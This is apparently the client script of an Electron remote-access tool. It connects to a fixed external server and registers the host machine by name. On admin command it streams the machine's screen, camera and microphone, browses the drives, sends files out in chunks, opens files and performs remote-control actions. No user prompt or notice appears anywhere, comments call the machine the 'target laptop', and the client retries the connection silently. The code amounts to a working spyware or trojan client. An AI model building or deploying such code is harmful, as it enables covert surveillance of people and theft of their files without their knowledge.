// =========================================================================
// VERY IMPORTANT:
// Change this to the IP Address of your main laptop (Anzee Laptop)
// Example: const SERVER_URL = "http://192.168.1.15:3000";
// =========================================================================
const SERVER_URL = "https://cml-0v9b.onrender.com"; // REPLACE THIS BEFORE BUILDING EXE!

let socket;
let localScreenStream;
let localCameraStream;
let peerConnection;
const configuration = {
    iceServers: [
        { urls: 'stun:stun1.l.google.com:19302' },
        { urls: 'stun:stun2.l.google.com:19302' },
        { urls: 'stun:stun3.l.google.com:19302' },
        { urls: 'stun:stun4.l.google.com:19302' },
        { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
        { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' },
        { urls: 'turn:openrelay.metered.ca:443?transport=tcp', username: 'openrelayproject', credential: 'openrelayproject' }
    ]
};
let iceCandidatesQueue = [];
let screenInterval = null;

window.onload = async () => {
    // Dynamically load socket.io-client from the server
    const script = document.createElement('script');
    script.src = SERVER_URL + '/socket.io/socket.io.js';

    script.onload = async () => {
        socket = io(SERVER_URL);

        // Get the computer name (e.g., "Aqu-Laptop")
        const hostname = await window.electronAPI.getHostname();

        socket.on('connect', () => {
            console.log("Connected to Admin Server");
            // Register this laptop to the Admin Dashboard (All-in-one app)
            socket.emit('register-client', { name: hostname, type: 'all' });
        });

        socket.on('request-screen', async (adminId) => {
            console.log("Admin requested SCREEN");
            try {
                const sources = await window.electronAPI.getSources();
                const mainScreen = sources[0];
                localScreenStream = await navigator.mediaDevices.getUserMedia({
                    audio: { mandatory: { chromeMediaSource: 'desktop' } },
                    video: { mandatory: { chromeMediaSource: 'desktop', chromeMediaSourceId: mainScreen.id } }
                });

                setupWebRTC(adminId, localScreenStream);
            } catch (e) {
                console.error("Screen Capture failed", e);
                socket.emit('client-error', "Screen Capture failed: " + e.message);
            }
        });

        // Handle stop screen
        socket.on('stop-screen', () => {
            console.log("Stopping SCREEN");
            if (localScreenStream) {
                localScreenStream.getTracks().forEach(track => track.stop());
                localScreenStream = null;
            }
            if (peerConnection) peerConnection.close();
            peerConnection = null;
        });

        // Handle explicit Camera/Mic request
        socket.on('request-camera', async (adminId) => {
            console.log("Admin requested CAMERA");
            try {
                localCameraStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                setupWebRTC(adminId, localCameraStream);
            } catch (camErr) {
                console.log("No Camera/Mic found or access denied.");
                socket.emit('client-error', "Camera not found on target laptop.");
            }
        });

        // Handle explicit Mic-only request
        socket.on('request-mic', async (adminId) => {
            console.log("Admin requested MIC ONLY");
            try {
                localCameraStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
                setupWebRTC(adminId, localCameraStream);
            } catch (camErr) {
                console.log("No Mic found or access denied.");
                socket.emit('client-error', "Mic not found on target laptop.");
            }
        });

        // Handle File Browser Request
        socket.on('request-files', async (data) => {
            const targetPath = data.path;
            if (!targetPath) {
                const drives = await window.electronAPI.getDrives();
                const driveItems = drives.map(d => ({ name: d, path: d, isDirectory: true, size: 0 }));
                socket.emit('file-list', { targetId: data.from, path: '', files: driveItems });
            } else {
                const result = await window.electronAPI.readDirectory(targetPath);
                if (result.error) {
                    socket.emit('file-list', { targetId: data.from, path: targetPath, error: result.error });
                } else {
                    socket.emit('file-list', { targetId: data.from, path: targetPath, files: result });
                }
            }
        });

        // Handle Open File Execution
        socket.on('open-file', async (filePath) => {
            await window.electronAPI.openFile(filePath);
        });

        // Handle File Download (Chunked)
        socket.on('download-file', async (data) => {
            const { path: filePath, adminId } = data;
            const size = await window.electronAPI.getFileSize(filePath);
            if (size === -1) {
                socket.emit('download-error', { adminId, error: 'File not found or permission denied' });
                return;
            }
            socket.emit('download-start', { adminId, name: filePath.split('\\').pop(), size, path: filePath });
        });

        socket.on('request-chunk', async (data) => {
            const { path: filePath, start, end, adminId } = data;
            const base64Data = await window.electronAPI.readFileChunk(filePath, start, end);
            socket.emit('download-chunk', { adminId, start, data: base64Data });
        });

        // Handle Remote Control Actions
        socket.on('remote-action', async (action) => {
            await window.electronAPI.remoteAction(action);
        });

        // Handle Force Stop from Server
        socket.on('force-stop-all', () => {
            console.log("Force Stop All received");
            if (localCameraStream) {
                localCameraStream.getTracks().forEach(track => track.stop());
                localCameraStream = null;
            }
            if (localScreenStream) {
                localScreenStream.getTracks().forEach(track => track.stop());
                localScreenStream = null;
            }
            if (peerConnection) {
                peerConnection.close();
                peerConnection = null;
            }
        });

        // Helper function to setup WebRTC
        async function setupWebRTC(adminId, stream) {
            if (peerConnection) peerConnection.close();
            peerConnection = new RTCPeerConnection(configuration);
            iceCandidatesQueue = [];

            peerConnection.onicecandidate = e => {
                if (e.candidate) socket.emit('ice-candidate', { candidate: e.candidate, targetId: adminId });
            };

            stream.getTracks().forEach(track => {
                peerConnection.addTrack(track, stream);
            });

            const offer = await peerConnection.createOffer();
            await peerConnection.setLocalDescription(offer);
            socket.emit('offer', { offer: offer, targetId: adminId });
        }

        socket.on('answer', async (data) => {
            if (!peerConnection) return;
            await peerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));
            for (let candidate of iceCandidatesQueue) {
                try { await peerConnection.addIceCandidate(new RTCIceCandidate(candidate)); } catch (err) { }
            }
            iceCandidatesQueue = [];
        });

        socket.on('ice-candidate', async (data) => {
            if (peerConnection) {
                if (peerConnection.remoteDescription) {
                    try { await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate)); } catch (err) { }
                } else {
                    iceCandidatesQueue.push(data.candidate);
                }
            }
        });

        socket.on('stop-screen', () => {
            console.log("Stopping screen share");
            if (screenInterval) clearInterval(screenInterval);
            if (localScreenStream) {
                localScreenStream.getTracks().forEach(t => t.stop());
                localScreenStream = null;
            }
        });

        socket.on('stop-camera', stopWebRTCStream);
        socket.on('stop-mic', stopWebRTCStream);

        function stopWebRTCStream() {
            console.log("Stopping WebRTC Stream (Camera/Mic)");
            if (localCameraStream) {
                localCameraStream.getTracks().forEach(t => t.stop());
                localCameraStream = null;
            }
            if (peerConnection) {
                peerConnection.close();
                peerConnection = null;
            }
        }

        socket.on('stop-watch', () => {
            console.log("Stopping all");
            if (screenInterval) clearInterval(screenInterval);
            if (localScreenStream) {
                localScreenStream.getTracks().forEach(t => t.stop());
                localScreenStream = null;
            }
            if (localCameraStream) {
                localCameraStream.getTracks().forEach(t => t.stop());
                localCameraStream = null;
            }
            if (peerConnection) {
                peerConnection.close();
                peerConnection = null;
            }
        });
    };

    // If server is not running right now, retry every 5 seconds silently
    script.onerror = () => {
        setTimeout(() => {
            window.location.reload();
        }, 5000);
    };

    document.head.appendChild(script);
};
